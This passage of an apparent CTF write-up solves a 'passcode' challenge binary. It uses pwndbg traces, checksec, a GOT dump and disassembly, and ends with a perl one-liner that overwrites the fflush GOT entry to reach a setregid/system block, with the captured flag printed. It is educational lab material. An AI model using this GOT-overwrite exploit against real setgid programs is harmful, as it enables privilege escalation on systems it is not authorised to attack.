+<span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a>01:0004│-074 0xffae9924 —▸ 0x94761a0 ◂— &#39;enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n&#39;</span>
+<span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a>02:0008│-070 0xffae9928 ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
+<span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a>... ↓        5 skipped</span>
+<span id="cb6-39"><a href="#cb6-39" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────<span class="co">[</span><span class="ot"> BACKTRACE </span><span class="co">]</span>───────────────────────────────────────────────────</span>
+<span id="cb6-40"><a href="#cb6-40" aria-hidden="true" tabindex="-1"></a> ► 0 0x8049362 welcome+112</span>
+<span id="cb6-41"><a href="#cb6-41" aria-hidden="true" tabindex="-1"></a>   1 0x8049395 main+49</span>
+<span id="cb6-42"><a href="#cb6-42" aria-hidden="true" tabindex="-1"></a>   2 0xf7cd0519 __libc_start_call_main+121</span>
+<span id="cb6-43"><a href="#cb6-43" aria-hidden="true" tabindex="-1"></a>   3 0xf7cd05f3 __libc_start_main+147</span>
+<span id="cb6-44"><a href="#cb6-44" aria-hidden="true" tabindex="-1"></a>   4 0x804910c _start+44</span>
+<span id="cb6-45"><a href="#cb6-45" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb6-46"><a href="#cb6-46" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; c</span>
+<span id="cb6-47"><a href="#cb6-47" aria-hidden="true" tabindex="-1"></a>Continuing.</span>
+<span id="cb6-48"><a href="#cb6-48" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-49"><a href="#cb6-49" aria-hidden="true" tabindex="-1"></a>Breakpoint 2, 0x0804921e in login ()</span>
+<span id="cb6-50"><a href="#cb6-50" aria-hidden="true" tabindex="-1"></a>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span>
+<span id="cb6-51"><a href="#cb6-51" aria-hidden="true" tabindex="-1"></a>──────────────────────────────<span class="co">[</span><span class="ot"> REGISTERS / show-flags off / show-compact-regs off </span><span class="co">]</span>──────────────────────────────</span>
+<span id="cb6-52"><a href="#cb6-52" aria-hidden="true" tabindex="-1"></a>*EAX  0x12</span>
+<span id="cb6-53"><a href="#cb6-53" aria-hidden="true" tabindex="-1"></a> EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1</span>
+<span id="cb6-54"><a href="#cb6-54" aria-hidden="true" tabindex="-1"></a>*ECX  0xf7ed9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span>
+<span id="cb6-55"><a href="#cb6-55" aria-hidden="true" tabindex="-1"></a> EDX  0</span>
+<span id="cb6-56"><a href="#cb6-56" aria-hidden="true" tabindex="-1"></a> EDI  0xf7f2eb80 (_rtld_global_ro) ◂— 0</span>
+<span id="cb6-57"><a href="#cb6-57" aria-hidden="true" tabindex="-1"></a> ESI  0xffae9a74 —▸ 0xffae9d62 ◂— &#39;/home/passcode/passcode&#39;</span>
+<span id="cb6-58"><a href="#cb6-58" aria-hidden="true" tabindex="-1"></a> EBP  0xffae9998 —▸ 0xffae99a8 —▸ 0xf7f2f020 (_rtld_global) —▸ 0xf7f2fa40 ◂— 0</span>
+<span id="cb6-59"><a href="#cb6-59" aria-hidden="true" tabindex="-1"></a>*ESP  0xffae9978 ◂— 0x41414141 (&#39;AAAA&#39;)</span>
+<span id="cb6-60"><a href="#cb6-60" aria-hidden="true" tabindex="-1"></a>*EIP  0x804921e (login+40) ◂— push dword ptr <span class="co">[</span><span class="ot">ebp - 0x10</span><span class="co">]</span></span>
+<span id="cb6-61"><a href="#cb6-61" aria-hidden="true" tabindex="-1"></a>───────────────────────────────────────<span class="co">[</span><span class="ot"> DISASM / i386 / set emulate off </span><span class="co">]</span>────────────────────────────────────────</span>
+<span id="cb6-62"><a href="#cb6-62" aria-hidden="true" tabindex="-1"></a> ► 0x804921e &lt;login+40&gt;    push   dword ptr <span class="co">[</span><span class="ot">ebp - 0x10</span><span class="co">]</span></span>
+<span id="cb6-63"><a href="#cb6-63" aria-hidden="true" tabindex="-1"></a>   0x8049221 &lt;login+43&gt;    lea    eax, <span class="co">[</span><span class="ot">ebx - 0x1fe5</span><span class="co">]</span></span>
+<span id="cb6-64"><a href="#cb6-64" aria-hidden="true" tabindex="-1"></a>   0x8049227 &lt;login+49&gt;    push   eax</span>
+<span id="cb6-65"><a href="#cb6-65" aria-hidden="true" tabindex="-1"></a>   0x8049228 &lt;login+50&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;</span>
+<span id="cb6-66"><a href="#cb6-66" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-67"><a href="#cb6-67" aria-hidden="true" tabindex="-1"></a>   0x804922d &lt;login+55&gt;    add    esp, 0x10</span>
+<span id="cb6-68"><a href="#cb6-68" aria-hidden="true" tabindex="-1"></a>   0x8049230 &lt;login+58&gt;    mov    eax, dword ptr <span class="co">[</span><span class="ot">ebx - 4</span><span class="co">]</span></span>
+<span id="cb6-69"><a href="#cb6-69" aria-hidden="true" tabindex="-1"></a>   0x8049236 &lt;login+64&gt;    mov    eax, dword ptr <span class="co">[</span><span class="ot">eax</span><span class="co">]</span></span>
+<span id="cb6-70"><a href="#cb6-70" aria-hidden="true" tabindex="-1"></a>   0x8049238 &lt;login+66&gt;    sub    esp, 0xc</span>
+<span id="cb6-71"><a href="#cb6-71" aria-hidden="true" tabindex="-1"></a>   0x804923b &lt;login+69&gt;    push   eax</span>
+<span id="cb6-72"><a href="#cb6-72" aria-hidden="true" tabindex="-1"></a>   0x804923c &lt;login+70&gt;    call   fflush@plt                  &lt;fflush@plt&gt;</span>
+<span id="cb6-73"><a href="#cb6-73" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-74"><a href="#cb6-74" aria-hidden="true" tabindex="-1"></a>   0x8049241 &lt;login+75&gt;    add    esp, 0x10</span>
+<span id="cb6-75"><a href="#cb6-75" aria-hidden="true" tabindex="-1"></a>────────────────────────────────────────────────────<span class="co">[</span><span class="ot"> STACK </span><span class="co">]</span>─────────────────────────────────────────────────────</span>
+<span id="cb6-76"><a href="#cb6-76" aria-hidden="true" tabindex="-1"></a>00:0000│ esp 0xffae9978 ◂— 0x41414141 (&#39;AAAA&#39;)</span>
+<span id="cb6-77"><a href="#cb6-77" aria-hidden="true" tabindex="-1"></a>01:0004│-01c 0xffae997c —▸ 0x8049203 (login+13) ◂— add ebx, 0x2dfd</span>
+<span id="cb6-78"><a href="#cb6-78" aria-hidden="true" tabindex="-1"></a>02:0008│-018 0xffae9980 ◂— &#39;AAAAAAAAAAAA&#39;</span>
+<span id="cb6-79"><a href="#cb6-79" aria-hidden="true" tabindex="-1"></a>... ↓        2 skipped</span>
+<span id="cb6-80"><a href="#cb6-80" aria-hidden="true" tabindex="-1"></a>05:0014│-00c 0xffae998c ◂— 0x9109a100</span>
+<span id="cb6-81"><a href="#cb6-81" aria-hidden="true" tabindex="-1"></a>06:0018│-008 0xffae9990 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1</span>
+<span id="cb6-82"><a href="#cb6-82" aria-hidden="true" tabindex="-1"></a>07:001c│-004 0xffae9994 —▸ 0xffae9a74 —▸ 0xffae9d62 ◂— &#39;/home/passcode/passcode&#39;</span>
+<span id="cb6-83"><a href="#cb6-83" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────<span class="co">[</span><span class="ot"> BACKTRACE </span><span class="co">]</span>───────────────────────────────────────────────────</span>
+<span id="cb6-84"><a href="#cb6-84" aria-hidden="true" tabindex="-1"></a> ► 0 0x804921e login+40</span>
+<span id="cb6-85"><a href="#cb6-85" aria-hidden="true" tabindex="-1"></a>   1 0x804939a main+54</span>
+<span id="cb6-86"><a href="#cb6-86" aria-hidden="true" tabindex="-1"></a>   2 0xf7cd0519 __libc_start_call_main+121</span>
+<span id="cb6-87"><a href="#cb6-87" aria-hidden="true" tabindex="-1"></a>   3 0xf7cd05f3 __libc_start_main+147</span>
+<span id="cb6-88"><a href="#cb6-88" aria-hidden="true" tabindex="-1"></a>   4 0x804910c _start+44</span>
+<span id="cb6-89"><a href="#cb6-89" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb6-90"><a href="#cb6-90" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; x/32xw $ebp - 0x10</span>
+<span id="cb6-91"><a href="#cb6-91" aria-hidden="true" tabindex="-1"></a>0xffae9988: 0x41414141  0x9109a100  0x0804c000  0xffae9a74</span>
+<span id="cb6-92"><a href="#cb6-92" aria-hidden="true" tabindex="-1"></a>0xffae9998: 0xffae99a8  0x0804939a  0xffae99c0  0xf7ed9000</span>
+<span id="cb6-93"><a href="#cb6-93" aria-hidden="true" tabindex="-1"></a>0xffae99a8: 0xf7f2f020  0xf7cd0519  0xffae9d62  0x00000070</span>
+<span id="cb6-94"><a href="#cb6-94" aria-hidden="true" tabindex="-1"></a>0xffae99b8: 0xf7f2f000  0xf7cd0519  0x00000001  0xffae9a74</span>
+<span id="cb6-95"><a href="#cb6-95" aria-hidden="true" tabindex="-1"></a>0xffae99c8: 0xffae9a7c  0xffae99e0  0xf7ed9000  0x08049364</span>
+<span id="cb6-96"><a href="#cb6-96" aria-hidden="true" tabindex="-1"></a>0xffae99d8: 0x00000001  0xffae9a74  0xf7ed9000  0xffae9a74</span>
+<span id="cb6-97"><a href="#cb6-97" aria-hidden="true" tabindex="-1"></a>0xffae99e8: 0xf7f2eb80  0xf7f2f020  0xce1bcd7f  0x0921e76f</span>
+<span id="cb6-98"><a href="#cb6-98" aria-hidden="true" tabindex="-1"></a>0xffae99f8: 0x00000000  0x00000000  0x00000000  0xf7f2eb80</span></code></pre></div>
+<p>the last four bytes in the buffer are right there in
+<code>passcode1</code>. what’s going on?</p>
+<p>when a stack frame is destroyed, the old data in the frame still
+resides there. in other words, stack space is not implicitly cleared
+when a function returns. so even though we’ve moved from
+<code>welcome()</code> to <code>login()</code>, the last four bytes in
+the buffer overlapped with the memory at <code>passcode1</code>, and is
+now effectively “inheriting” that data. one thing that makes this effect
+reproducible is the exclusion of PIE (position independent
+executable):</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; !checksec passcode</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co">[</span><span class="ot">*</span><span class="co">]</span> &#39;/home/passcode/passcode&#39;</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    Arch:       i386-32-little</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    RELRO:      Partial RELRO</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    Stack:      Canary found</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    NX:         NX enabled</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    PIE:        No PIE (0x8048000)</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>    Stripped:   No</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; !ls -l passcode</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>-r-xr-sr-x 1 root passcode_pwn 15232 Apr 19  2025 passcode</span></code></pre></div>
+<p>PIE allows the binary to run anywhere in memory and enables ASLR
+(address space layout randomization), which is a security measure that
+randomizes the layout of memory regions each time the program runs.
+these features are enabled by default on modern compilers and kernels,
+but here, we can take advantage of the program’s predictable memory
+layout and write data to a targeted address.</p>
+<p>the last piece of this exploit involves the GOT (global offset
+table)—the GOT is a region in memory that resolves dynamic library
+function calls to their respective absolute addresses. we can view the
+GOT with <code>objdump</code>:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; !objdump -R passcode</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>passcode:     file format elf32-i386</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>DYNAMIC RELOCATION RECORDS</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>OFFSET   TYPE              VALUE</span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>0804bff8 R_386_GLOB_DAT    __gmon_start__@Base</span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>0804bffc R_386_GLOB_DAT    stdin@GLIBC_2.0</span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>0804c00c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.34</span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>0804c010 R_386_JUMP_SLOT   printf@GLIBC_2.0</span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0</span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>0804c018 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4</span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>0804c01c R_386_JUMP_SLOT   getegid@GLIBC_2.0</span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>0804c020 R_386_JUMP_SLOT   puts@GLIBC_2.0</span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>0804c024 R_386_JUMP_SLOT   system@GLIBC_2.0</span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>0804c028 R_386_JUMP_SLOT   exit@GLIBC_2.0</span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>0804c02c R_386_JUMP_SLOT   setregid@GLIBC_2.0</span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>0804c030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span></code></pre></div>
+<p>with PIE disabled, the GOT offsets for glibc functions remain fixed.
+and with an arbitrary write primitive now at our disposal, it’s possible
+to hardcode an offset into <code>passcode1</code> and write directly to
+it with the buggy <code>scanf()</code>. I’ll pick the
+<code>fflush()</code> offset since it can be immediately called after
+<code>scanf()</code>. what shall we write to it?</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>   0x080492a1 &lt;+171&gt;:   call   0x8049080 &lt;getegid@plt&gt;</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>   0x080492a6 &lt;+176&gt;:   mov    esi,eax</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>   0x080492a8 &lt;+178&gt;:   call   0x8049080 &lt;getegid@plt&gt;</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>   0x080492ad &lt;+183&gt;:   sub    esp,0x8</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>   0x080492b0 &lt;+186&gt;:   push   esi</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>   0x080492b1 &lt;+187&gt;:   push   eax</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>   0x080492b2 &lt;+188&gt;:   call   0x80490c0 &lt;setregid@plt&gt;</span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>   0x080492b7 &lt;+193&gt;:   add    esp,0x10</span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>   0x080492ba &lt;+196&gt;:   sub    esp,0xc</span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>   0x080492bd &lt;+199&gt;:   lea    eax,<span class="co">[</span><span class="ot">ebx-0x1fb9</span><span class="co">]</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>   0x080492c3 &lt;+205&gt;:   push   eax</span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>   0x080492c4 &lt;+206&gt;:   call   0x80490a0 &lt;system@plt&gt;</span></code></pre></div>
+<p>this block seems like a good place to jump to. we’ll get the
+effective group id of the <code>passcode_pwn</code> user, escalate
+privileges with <code>setregid()</code>, and read the flag to win.
+putting it all together:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>passcode@ubuntu:~$ echo $((0x080492a1))</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>134517409</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>passcode@ubuntu:~$ perl -e &#39;print &quot;A&quot;x96 . &quot;\x14\xc0\x04\x08&quot; . &quot;\n134517409&quot;&#39; | ./passcode</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>Toddler&#39;s Secure Login System 1.1 beta.</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>s0rry_mom_I_just_ign0red_c0mp1ler_w4rning</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>enter passcode1 : Now I can safely trust you that you have credential :)</span></code></pre></div>
+<p>we fill the buffer with 96 bytes, write the <code>fflush()</code> GOT
+offset into <code>passcode1</code>, buffer the input stream with
+<code>"\n"</code> so that <code>scanf()</code> can read the next string,
+and finally, write the <em>decimal</em> representation of the
+<code>getegid()</code> instruction address we want to jump to. when we
+reach <code>fflush()</code> on line 10, it never actually executes—it
+sees that we overwrote <code>0x0804c014</code> with
+<code>0x080492a1</code> in the GOT and ran that instead. pretty
+cool.</p>
+<br>
+<hr>
+</body>
+</html>
